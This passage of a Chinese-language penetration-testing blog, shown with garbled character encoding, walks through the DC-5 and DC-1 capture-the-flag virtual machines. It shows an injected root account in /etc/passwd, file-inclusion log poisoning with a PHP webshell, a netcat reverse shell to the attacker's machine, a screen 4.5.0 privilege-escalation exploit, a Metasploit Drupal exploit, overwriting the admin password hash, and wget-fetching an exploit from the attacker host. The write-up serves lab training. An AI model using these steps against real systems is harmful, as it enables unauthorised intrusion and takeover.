å…¥åˆ°rootç»„ä¸­ï¼Œæ—¢å¯æ‹¥æœ‰rootæƒé™(åœ¨åå¼¹çš„shellä¸­æ‰§è¡Œè¯¥å‘½ä»¤)</p><pre><code class="hljs sh">hacker:$1$hacker<span class="hljs-variable">$6luIRwdGpBvXdP</span>.GMwcZp/:0:0::/root:/bin/bash</code></pre><p>å°†è¯¥ç”¨æˆ·çš„ä¿¡æ¯å†™å…¥åˆ°<code>/etc/passwd</code>ä¸­ï¼Œå°±æƒ³å½“äºåœ¨é¶æœºä¸­åˆ›å»ºäº†ä¸€ä¸ªrootç”¨æˆ·æƒé™çš„ç”¨æˆ·</p><pre><code class="hljs sh">ehco <span class="hljs-string">&#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre><p>åˆ‡æ¢ç”¨æˆ·</p><pre><code class="hljs sh">su hacker</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930002110117.png" alt="image-20220930002110117"></p><h2 id="è¯»å–flag"><a href="#è¯»å–flag" class="headerlink" title="è¯»å–flag"></a>è¯»å–flag</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929122622040.png" alt="image-20220929122622040"></p><h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è¿è¡Œè™šæ‹Ÿæœºåï¼Œå°†kaliä¸é¶æœºé…ç½®åˆ°åŒä¸€ç½‘å¡ä¸‹å³å¯</p><p>kaliçš„ipåœ°å€ï¼š<code>192.168.56.101</code></p><h2 id="ç½‘ç»œå—…æ¢-1"><a href="#ç½‘ç»œå—…æ¢-1" class="headerlink" title="ç½‘ç»œå—…æ¢"></a>ç½‘ç»œå—…æ¢</h2><p>åœ¨kaliä¸­ä½¿ç”¨netdiscoverå‘ç°å½“å‰ç½‘ç»œä¸­å­˜æ´»çš„ä¸»æœº</p><pre><code class="hljs sh">netdiscover -i eth0</code></pre><p>æ¢æµ‹åˆ°é¶æœºçš„ipåœ°å€ä¸ºï¼š<code>192.168.56.102</code></p><p>å†ä½¿ç”¨nmapæ‰«æå¼€æ”¾çš„æœåŠ¡ç«¯å£</p><pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.56.102</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930163714244.png" alt="image-20220930163714244"></p><p>å¯ä»¥çœ‹åˆ°é¶æœºçš„80ç«¯å£æ˜¯å¼€å¯çš„ï¼Œç›´æ¥è®¿é—®ã€‚</p><h2 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h2><p>ç½‘é¡µä¸­å­˜åœ¨ä¸€ä¸ªç•™è¨€æ¿<code>http://192.168.220.139/contact.php</code></p><p>æäº¤ç•™è¨€ä¿¡æ¯ä¼šè·³è½¬åˆ°<code>http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1</code></p><p>æ­¤æ—¶å†æ¬¡åˆ·æ–°é¡µé¢ï¼Œä¼šå‘ç°å³ä¸‹è§’çš„copyrightä¼šå‘ç”Ÿå˜åŒ–</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930164227501.png" alt="image-20220930164227501"></p><p>é¦–å…ˆä½¿ç”¨dirb å»æ¢æµ‹ç½‘ç«™ä¸­çš„æ‰€æœ‰urlï¼Œä½†æ˜¯æ•ˆæœä¸å¥½åªèƒ½æ¢æµ‹åˆ°index.php</p><p>é‚£ä¹ˆå°±ç”¨bpçš„intruderæ¨¡å—åŠ è½½è‡ªå·±çš„å­—å…¸è¿›è¡Œè·¯åŠ²çˆ†ç ´ï¼Œæœ€åçˆ†ç ´ç»“æœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930172927445.png" alt="image-20220930172927445"></p><p>è¿™é‡Œçš„footeræ˜¯ç½‘é¡µæºç ä¸­æ²¡æœ‰æš´éœ²çš„é¡µé¢ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930173042421.png" alt="image-20220930173042421"></p><p>ç”±äºfooter.phpçš„å†…å®¹å¯ä»¥æ˜¾ç¤ºå­å†thankyou.phpä¸­ï¼Œé‚£ä¹ˆthankyou.phpä¸€å®šæ˜¯åŒ…å«äº†footer.phpï¼Œé‚£ä¹ˆä¸‹é¢çš„è¦æ‰¾å‡ºthankyou.phpåŒ…å«æ–‡ä»¶çš„å‚æ•°æ˜¯ä»€ä¹ˆ</p><p>å°è¯•</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?page=footer.phphttp:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?file=footer.php</code></pre><p>å‘ç°ä»¥ä¸Šä¸¤ä¸ªå‚æ•°éƒ½å¯ä»¥æ­£å¸¸è®¿é—®</p><p>æ¥ä¸‹æ¥å°±æ˜¯å°è¯•æ–‡ä»¶åŒ…å«æ¼æ´</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>ä¸Šé¢å·²ç»å‘ç°é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¾ˆç›´è§‚çš„æƒ³æ³•å°±æ˜¯çœ‹èƒ½å¦å°†<code>/etc/passwd</code>è¯»å–åˆ°</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930232717029.png" alt="image-20220930232717029"></p><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span></code></pre><p>ä»httpçš„å“åº”å¤´å¯ä»¥çœ‹åˆ°ç½‘ç«™ä½¿ç”¨çš„ä¸­é—´ä»¶æ˜¯nginxï¼Œé‚£ä¹ˆå¯å°è¯•è·å–å»nginxçš„æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤ç»å¯¹è·¯å¾„ä¸º<code>/var/log/nginx/access.log</code></p><p>ä½¿ç”¨url<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001160016500.png" alt="image-20221001160016500"></p><p>è¿™é‡Œä¸€å®šå¾—è¦ç”¨bpï¼Œä¸ç„¶ä¼šç”±äºæµè§ˆå™¨çš„è‡ªåŠ¨ç¼–ç å¯¼è‡´å¤±æ•ˆ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001105755300.png" alt="image-20221001105755300"></p><p>èƒ½å¤Ÿå‘ç°åˆšæ‰çš„è®¿é—®è®°å½•å·²ç»è¢«å†™å…¥åˆ°äº†æ—¥å¿—æ–‡ä»¶ä¸­</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930234744268.png" alt="image-20220930234744268"></p><p><strong>PHPä¸­é€ æˆæ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°</strong></p><blockquote><p><strong>1ã€include() ã€require()</strong></p><p><strong>å½“ä½¿ç”¨include()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ° include() å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</strong></p><p><strong>å½“ä½¿ç”¨require()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªè¦ç¨‹åºä¸€æ‰§è¡Œå°±ä¼šç«‹å³è°ƒç”¨æ–‡ä»¶,å‘ç”Ÿé”™è¯¯çš„æ—¶å€™ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œ</strong></p><p><strong>2ã€include_once() åŠŸèƒ½å’Œ include() ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</strong></p><p><strong>require_once()åŠŸèƒ½å’Œrequire()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</strong></p><p>â€‹       <strong>å½“ä½¿ç”¨ä¸Šè¿°å››ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸º PHP ä»£ç æ‰§è¡Œï¼Œphp å†…æ ¸å¹¶ä¸åœ¨æ„è¯¥è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯ txt æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ã€è¿œç¨‹ urlã€ä¹Ÿéƒ½å°†ä½œä¸º PHP ä»£ç æ‰§è¡Œã€‚</strong></p></blockquote><p>ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ æˆåŠŸåï¼Œå°±å¯ä»¥ä½¿ç”¨èšå‰‘è¿æ¥äº†</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span><span class="hljs-regexp">/thankyou.php?file=/</span>var<span class="hljs-regexp">/log/</span>nginx/access.logå¯†ç ï¼š<span class="hljs-number">666</span></code></pre><h2 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h2><p>å†kaliä¸­ç›‘å¬4444ç«¯å£</p><pre><code class="hljs sh">nc -lvvp 4444</code></pre><p>å†èšå‰‘çš„ç»ˆç«¯ä¸­æ‰§è¡Œ</p><pre><code class="hljs sh">nc  -e  /bin/bash  192.168.56.101 4444</code></pre><p>æ­¤æ—¶å·²ç»è·å–shell</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113341268.png" alt="image-20221001113341268"></p><p>ä½¿ç”¨pythonçš„åå¼¹shell</p><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre><h2 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä½¿ç”¨findå‘½ä»¤ï¼ŒæŸ¥æ‰¾å…·æœ‰suidæƒé™çš„å‘½ä»¤ï¼Œå‘ç°screen-4.5.0</p><pre><code class="hljs sh">find / -perm /4000 2 &gt; /dev/null</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113542405.png" alt="image-20221001113542405"></p><p>é‚£ä¹ˆå°±å¯ä»¥æŸ¥æ‰¾å¯ç”¨äºscreen 4.5.0çš„æ¼æ´è„šæœ¬æ–‡ä»¶ï¼Œå†kaliä¸­æŸ¥æ‰¾</p><pre><code class="hljs sh">searchsploit screen 4.5.0</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113845331.png" alt="image-20221001113845331"></p><p>å°†è„šæœ¬æ‹·è´åˆ°å½“å‰å·¥ä½œç›®å½•</p><pre><code class="hljs sh">cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41154.sh  41154.shcp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41152.txt  41152.txt</code></pre><p>å°è¯•ä»èšå‰‘ä¸Šä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œä½†æ˜¯å‘ç°æƒé™ä¸å¤Ÿï¼Œæœ€åå†/tmpç›®å½•ä¸Šä¼ æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120350730.png" alt="image-20221001120350730"></p><p>åŠ ä¸Šå¯æ‰§è¡Œæƒé™å³å¯</p><pre><code class="hljs sh">chmod +x 41154.sh</code></pre><p>åœ¨kaliä¸­çš„shellæ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120551421.png" alt="image-20221001120551421"></p><h2 id="è·å¾—flag"><a href="#è·å¾—flag" class="headerlink" title="è·å¾—flag"></a>è·å¾—flag</h2><p>è¿›å…¥rootç›®å½•å³å¯è·å–åˆ°flag</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120217058.png" alt="image-20221001120217058"></p><h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å°†é¶æœºä¸kaliæ”¾åœ¨åŒä¸€ç½‘å¡ä¸‹å®ç°ç›¸äº’é€šä¿¡å³å¯</p><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>ä½¿ç”¨</p><pre><code class="hljs sh">arp-scan -lnetdiscover -eth0</code></pre><p>å‘ç°ç›®æ ‡é¶æœºçš„ipåœ°å€ä¸º<code>192.168.56.103</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005124337784.png" alt="image-20221005124337784"></p><p>ç›´æ¥æ–¹ä½è¯¥ipåœ°å€ï¼Œå‘ç°æ˜¯å¯è®¿é—®çš„ç½‘ç«™ï¼Œä½†æ˜¯éœ€è¦å¯†ç æ— æ³•è¿›å…¥</p><p>ä½†æ˜¯å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ­¤ç½‘ç«™ä½¿ç”¨çš„CMSä¸ºDrupal,é‚£ä¹ˆå°±å¯»æ‰¾ä¸è¯¥CMSå­˜åœ¨çš„æ¼æ´å³å¯</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005125020123.png" alt="image-20221005125020123"></p><p>å¯ä»¥çœ‹åˆ°å…³äºdrupal çš„æ¼æ´æœ‰ä¸ƒä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦é€‰æ‹©æœ€æ–°çš„ä¸”ç­‰çº§ä¸ºexcellentçš„</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>exploit/multi/http/drupal_drupageddon</code></p><pre><code class="hljs sh">use exploit/multi/http/drupal_drupageddon<span class="hljs-built_in">set</span> RHOSTS 192.168.56.103<span class="hljs-built_in">set</span> LHOST 192.168.56.101run</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005130958089.png" alt="image-20221005130958089"></p><p>ç½‘ç«™çš„æ ¹ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ªflag1.txtï¼Œå…¶ä¸­æç¤º</p><pre><code class="hljs gradle"><span class="hljs-keyword">Every</span> good CMS needs a config <span class="hljs-keyword">file</span> - and so <span class="hljs-keyword">do</span> you.</code></pre><p>é‚£ä¹ˆå°±æ˜¯æ‰¾cmsçš„é…ç½®æ–‡ä»¶ï¼Œè€Œdrupalçš„é»˜è®¤é…ç½®æ–‡ä»¶ä½ç½® <code>/var/www/sites/default/settings.php</code></p><p>æŸ¥çœ‹æ­¤é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°mysqlæ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005131437953.png" alt="image-20221005131437953"></p><p>å¹¶ä¸”å‡ºç°äº†flag2</p><blockquote><p>ç¿»è¯‘:è›®åŠ›å’Œå­—å…¸æ”»å‡»ä¸è¡Œï¼Œå”¯ä¸€æ–¹æ³•æ˜¯è·å¾—è®¿é—®æƒé™(ä½ å°†éœ€è¦è®¿é—®çš„)ã€‚ä½ èƒ½ç”¨è¿™äº›å‡­è¯åšä»€ä¹ˆ?</p></blockquote><h2 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="äº¤äº’å¼shell"></a>äº¤äº’å¼shell</h2><p>åœ¨msfconsoleä¸­è·å–shellåä½¿ç”¨æ‰§è¡Œä¸‹é¢è¿™å¥è¯</p><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>è¿æ¥æ•°æ®åº“mysql -udbuser -p</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005133337362.png" alt="image-20221005133337362"></p><p>å¯†ç æ˜¯åŠ å¯†åä¿å­˜åˆ°æ•°æ®åº“çš„ã€‚ä½†æ˜¯åœ¨<code>/var/www/script</code>ä¸­å‘ç°äº†å°†å¯†ç è½¬æ¢ä¸ºhashçš„è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬ç”Ÿæˆè‡ªå·±çš„å¯†ç çš„hashç„¶åä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå¯æƒœçš„æ˜¯è¯¥æ ‡æœ¬çš„ç¯å¢ƒå­˜åœ¨é—®é¢˜ï¼Œæ— æ³•è¿è¡Œ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005134059498.png" alt="image-20221005134059498"></p><p>ç™¾åº¦ä»¥ä¸‹<code>drupal å¯†ç </code>ç›¸å…³çš„é—®é¢˜ï¼Œå‘ç°æœ‰é‡ç½®adminå¯†ç çš„æ–¹æ³•</p><blockquote><p>passwordçš„SHA-512åŠ å¯†è¿ç®—çš„ç»“æœâ€œ$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4â€ï¼›</p></blockquote><p>é‚£ä¹ˆå°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ›´æ–°adminçš„å¯†ç å³å¯</p><pre><code class="hljs mysql">update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;;</code></pre><p>ç™»å½•ååœ¨ç½‘ç«™ä¸­å‘ç°äº†flag3</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135247304.png" alt="image-20221005135247304"></p><blockquote><p>ç‰¹æ®Šçš„PERMSå°†å¸®åŠ©æŸ¥æ‰¾passwd -ä½†æ‚¨éœ€è¦-execè¯¥å‘½ä»¤æ¥æ‰¾å‡ºå¦‚ä½•è·å–é˜´å½±ä¸­çš„å†…å®¹ã€‚</p></blockquote><p>åœ¨<code>home/flag4</code>ä¸­çœ‹åˆ°flag4</p><blockquote><p>Can you use this same method to find or access the flag in root?</p><p>Probably. But perhaps itâ€™s not that easy.  Or maybe it is?</p><p>æ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•åœ¨æ ¹ç›®å½•ä¸­æŸ¥æ‰¾æˆ–è®¿é—®æ ‡å¿—å—?</p><p>å¯èƒ½ã€‚ä½†ä¹Ÿè®¸å¹¶æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·?</p></blockquote><p><strong>ä½¿ç”¨CVE2014-3704æ·»åŠ ç®¡ç†è´¦å·</strong></p><p>åœ¨exploit-dbä¸­æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„EXPï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†è´¦å·<br>åœ°å€ï¼š<a href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a></p><p>åœ¨kaliä¸­å¼€å¯webæœåŠ¡ï¼Œç„¶åå†é¶æœºä¸­ä¸‹è½½è¯¥exp</p><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005142802768.png" alt="image-20221005142802768"></p><pre><code class="hljs awk">é¶æœºç«¯ä¸‹è½½wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span>/<span class="hljs-number">34992</span>.pyé¶æœºç«¯è¿è¡Œpython <span class="hljs-number">34992</span>.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.103</span>/ -u hack -p root</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005143232685.png" alt="image-20221005143232685"></p><p>ç›´æ¥ä½¿ç”¨hack ç™»å½•</p><h2 id="ææƒ-2"><a href="#ææƒ-2" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä½¿ç”¨findæ‰¾ä¸‹å…·æœ‰rootæƒé™çš„suid</p><pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/nullfind / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null  <span class="hljs-comment"># è¿™å¥ä¹Ÿå¯ä»¥</span></code></pre><p><img 